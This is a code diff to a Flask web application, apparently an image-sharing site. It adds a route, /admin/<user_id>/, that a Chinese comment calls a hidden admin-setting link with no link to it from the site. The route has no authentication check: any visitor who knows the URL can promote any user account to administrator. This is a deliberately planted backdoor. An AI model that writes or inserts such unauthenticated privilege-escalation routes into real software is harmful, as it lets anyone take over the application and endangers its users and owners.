@@ -337,3 +337,15 @@ def quitpriority_image(image_id):
         image.priority = 0
         db.session.commit()
         return  redirect('/image/'+str(image_id) + '/')
+
+#     隐藏的设置管理员连接，网页无链接进入
+@app.route('/admin/<int:user_id>/')
+def admin_user(user_id):
+    user = User.query.get(user_id)
+    if user != None:
+        if user.user_type != 'admin':
+            user.user_type = 'admin'
+            db.session.commit()
+            return 'Set '+user.username+' to be administer acconnt OK!'
+        return  'User named '+user.username + ' is already be administer account!'
+    return 'Wrong user_id!'
